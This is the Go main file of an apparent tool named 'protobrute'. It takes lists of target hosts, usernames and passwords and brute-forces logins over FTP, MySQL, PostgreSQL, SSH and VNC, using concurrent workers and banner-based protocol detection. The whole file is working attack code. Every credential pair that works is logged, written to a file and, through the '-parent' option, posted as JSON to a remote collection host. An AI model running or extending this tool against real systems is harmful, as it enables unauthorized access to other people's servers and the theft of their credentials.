package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"protobrute/models"
	prb "protobrute/pkg/common"
	"protobrute/pkg/protocols/ftp"
	"protobrute/pkg/protocols/mysql"
	"protobrute/pkg/protocols/postgres"
	"protobrute/pkg/protocols/ssh"
	"protobrute/pkg/protocols/vnc"
	"strings"

	"golang.org/x/sync/semaphore"
)

type AutoDetect interface {
	Detect(banner string) (bool, error)
}

type Protocol interface {
	Brute(host string, usernames []string, passwords []string) (models.ValidCredentials, error)
}

func main() {
	var options models.Options
	var err error

	flag.StringVar(&options.TargetFile, "targets", "", "file containing list of targets to brute force")
	flag.StringVar(&options.UsernameFile, "u", "", "file containing username list")
	flag.StringVar(&options.PasswordsFile, "p", "", "file containing password list")
	flag.IntVar(&options.Threads, "t", 1, "amount of threads")
	flag.StringVar(&options.Protocol, "protocol", "", "use a specific protocol")
	flag.BoolVar(&options.AutoDetect, "auto", true, "auto detect protocols (limited support)")
	flag.StringVar(&options.Outfile, "o", "", "write valid credentials to a file")
	flag.StringVar(&options.ParentHost, "parent", "", "host to post valid credentials in json format")
	flag.StringVar(&options.HeaderString, "headers", "", "headers to add to post request format: 'key:value,key:value'")
	flag.Parse()

	if len(os.Args) == 1 {
		flag.Usage()
		os.Exit(0)
	}

	headers := make(map[string]string)
	if options.HeaderString != "" {
		headerList := strings.Split(options.HeaderString, ",")
		for _, header := range headerList {
			keyvalue := strings.Split(header, ":")
			headers[keyvalue[0]] = keyvalue[1]
		}
	}

	var hitFile *os.File
	if options.Outfile != "" {
		hitFile, err = os.OpenFile(options.Outfile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0666)
		if err != nil {
			log.Fatal(err)
		}
	}

	targets, err := os.Open(options.TargetFile)
	if err != nil {
		log.Fatal(err)
	}

	usernames, err := prb.ReadList(options.UsernameFile)
	if err != nil {
		log.Fatal(err)
	}

	passwords, err := prb.ReadList(options.PasswordsFile)
	if err != nil {
		log.Fatal(err)
	}

	ctx := context.Background()

	var (
		maxWorkers = options.Threads
		sem        = semaphore.NewWeighted(int64(maxWorkers))
	)
	scanner := bufio.NewScanner(targets)

	for scanner.Scan() {

		if err := sem.Acquire(ctx, 1); err != nil {
			fmt.Printf("Failed to acquire semaphore %s\n", err.Error())
			break
		}

		go func() {
			defer sem.Release(1)
			host := scanner.Text()

			if options.Protocol != "" {
				var credentials models.ValidCredentials
				switch options.Protocol {
				case "ftp":
					credentials, err = ftp.FTP{}.Brute(host, usernames, passwords)
					if err != nil {
						log.Println(err)
					}
				case "mysql":
					credentials, err = mysql.MYSQL{}.Brute(host, usernames, passwords)
					if err != nil {
						log.Println(err)
					}
				case "postgres":
					credentials, err = postgres.POSTGRES{}.Brute(host, usernames, passwords)
					if err != nil {
						log.Println(err)
					}
				case "ssh":
					credentials, err = ssh.SSH{}.Brute(host, usernames, passwords)
					if err != nil {
						log.Println(err)
					}
				case "vnc":
					credentials, err = vnc.VNC{}.Brute(host, usernames, passwords)
					if err != nil {
						log.Println(err)
					}
				default:
					log.Fatalf("protocol '%s' unsupported", options.Protocol)
				}
				if (credentials.Credentials.Username != "") || (credentials.Credentials.Password != "") {
					log.Println(credentials.ToString())
					if options.Outfile != "" {
						hitFile.WriteString(credentials.ToString() + "\n")
					}
					if options.ParentHost != "" {
						respCode, err := prb.PostValid(options.ParentHost, headers, credentials)
						if err != nil {
							log.Println(respCode, err)
						}
					}
				}
			} else {
				banner, err := prb.Handshake(host)
				if err != nil {
					return
				}
				if banner != "" {
					var credentials models.ValidCredentials
					if target, err := ftp.Detect(banner); err == nil {
						credentials, err = target.Brute(host, usernames, passwords)
						if err != nil {
							log.Println(err)
						}
					} else if target, err := mysql.Detect(banner); err == nil {
						credentials, err = target.Brute(host, usernames, passwords)
						if err != nil {
							log.Println(err)
						}
					} else if target, err := ssh.Detect(banner); err == nil {
						credentials, err = target.Brute(host, usernames, passwords)
						if err != nil {
							log.Println(err)
						}
					} else if target, err := vnc.Detect(banner); err == nil {
						credentials, err = target.Brute(host, usernames, passwords)
						if err != nil {
							log.Println(err)
						}
					}
					if (credentials.Credentials.Username != "") || (credentials.Credentials.Password != "") {
						log.Println(credentials.ToString())
						if options.Outfile != "" {
							hitFile.WriteString(credentials.ToString() + "\n")
						}
						if options.ParentHost != "" {
							respCode, err := prb.PostValid(options.ParentHost, headers, credentials)
							if err != nil {
								log.Println(respCode, err)
							}
						}
					}
				}
			}
		}()
	}
	if err := sem.Acquire(ctx, int64(maxWorkers)); err != nil {
		fmt.Printf("Failed to acquire semaphore: %s\n", err.Error())
	}

	fmt.Println("\nFinished!")
}
